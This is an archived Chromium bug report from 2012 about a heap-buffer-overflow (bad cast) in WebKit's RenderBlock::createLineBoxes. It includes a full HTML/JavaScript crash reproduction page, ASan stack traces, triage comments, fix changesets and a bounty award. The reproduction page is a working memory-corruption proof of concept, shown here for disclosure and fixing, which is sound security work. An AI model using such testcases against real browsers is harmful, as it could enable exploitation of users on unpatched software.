# Bad cast in WebCore::RenderBlock::createLineBoxes

| Field | Value |
|-------|-------|
| **Issue ID** | [40053446](https://issues.chromium.org/issues/40053446) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-08 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

a bug of renderblocks

**VERSION**  

Chrome Version: all  

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
-webkit-line-box-contain: block;
-webkit-column-count: 1;
}
#el2 {
display: list-item;
}
#el3::after {
display: block;
content: "A";
}
#el4 {
display: inline;
-webkit-column-span: all;
}
</style>
<script>
function crash(){
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
document.body.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el2.appendChild(el3)
el4 = document.createElement('div')
el4.setAttribute('id', 'el4')
el3.appendChild(el4)
setTimeout(function() {
el4.style.display='table'
},0)
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==6826== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffed2215c0 at pc 0x55555aaf5859 bp 0x7ffffffefdd0 sp 0x7ffffffefdc8  

READ of size 8 at 0x7fffed2215c0 thread T0  

#0 0x55555aaf5859 in WebCore::InlineFlowBox::addToLine(WebCore::InlineBox\*) ???:0  

#1 0x55555ab95d16 in WebCore::RenderBlock::createLineBoxes(WebCore::RenderObject\*, WebCore::LineInfo const&, WebCore::InlineBox\*) ???:0

0x7fffed2215c0 is located 8 bytes to the right of 56-byte region [0x7fffed221580,0x7fffed2215b8)  

allocated by thread T0 here:  

#0 0x55555d8f2c32 in malloc ??:0  

#1 0x55555abe18a7 in WebCore::RenderBox::createInlineBox() ???:0  

#2 0x55555ab96047 in WebCore::RenderBlock::createLineBoxes(WebCore::RenderObject\*, WebCore::LineInfo const&, WebCore::InlineBox\*) ???:0  

#3 0x55555ab96697 in WebCore::RenderBlock::constructLine(WebCore::BidiRunList[WebCore::BidiRun](javascript:void(0);)&, WebCore::LineInfo const&) ???:0

## Attachments

- [asan-stufz-4056.txt](attachments/asan-stufz-4056.txt) (text/x-c; charset=us-ascii, 8.6 KB)
- [stufz4056.html](attachments/stufz4056.html) (text/html; charset=us-ascii, 1009 B)
- [stable-asan-stufz-4056.txt](attachments/stable-asan-stufz-4056.txt) (text/plain; charset=us-ascii, 9.2 KB)
- [stufz856.html](attachments/stufz856.html) (text/html; charset=us-ascii, 968 B)
- [beta-asan-stufz-4056.txt](attachments/beta-asan-stufz-4056.txt) (text/plain; charset=us-ascii, 8.7 KB)
- [asan-stufz-856.txt](attachments/asan-stufz-856.txt) (text/x-c; charset=us-ascii, 9.3 KB)
- [beta-asan-stufz-856.txt](attachments/beta-asan-stufz-856.txt) (text/plain; charset=us-ascii, 8.8 KB)
- [stable-asan-stufz-856.txt](attachments/stable-asan-stufz-856.txt) (text/plain; charset=us-ascii, 9.4 KB)

## Timeline

### in...@chromium.org (2012-02-08)

FYI, Sheriff! dont dupe it against one of the shadow dom bugs! Because of recent stream of those bugs(dependent on enabling that flag), they crash all over the place, so many of those stack overlap. we need a way to fix this on ClusterFuzz.

### ts...@chromium.org (2012-02-08)

Upstreamed as https://bugs.webkit.org/show_bug.cgi?id=78160

### ts...@chromium.org (2012-02-09)

Chrome 19.0.1036/Linux/Debug trips over an assertion on stufz856.html (same assert in 18.0.1025, 17.0.963):

ASSERTION FAILED: obj->isRenderInline() || obj == this
third_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp(407) : WebCore::InlineFlowBox* WebCore::RenderBlock::createLineBoxes(WebCore::RenderObject*, const WebCore::LineInfo&, WebCore::InlineBox*)



### in...@chromium.org (2012-02-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=19511192

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7fb351adace0
Crash State:
  - crash stack -
  WebCore::RenderBlock::createLineBoxes
  WebCore::RenderBlock::constructLine
  WebCore::RenderBlock::createLineBoxesFromBidiRuns
  

Minimized Testcase (0.83 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94tzW1kUPsBhcPWnd7JyiYiFV93moun8K7PPSficgb1Cf9dhwXLssSDg2LQzBjCz4Lq58q4b4ziqFK7fdOzX3aVSMwlK1gJwaQpsbmZSRKQp5krF3URlRxjIkwYB_V0roMR0mmArwcLsZBypZOfV7Xhh5DKbw

### in...@chromium.org (2012-02-09)

bad cast is sec-severity high

### in...@chromium.org (2012-02-09)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-13)

http://trac.webkit.org/changeset/107613

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109380
M18: http://trac.webkit.org/changeset/109381

### sc...@gmail.com (2012-03-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-03)

$1000 etc.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/113258?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053446)*
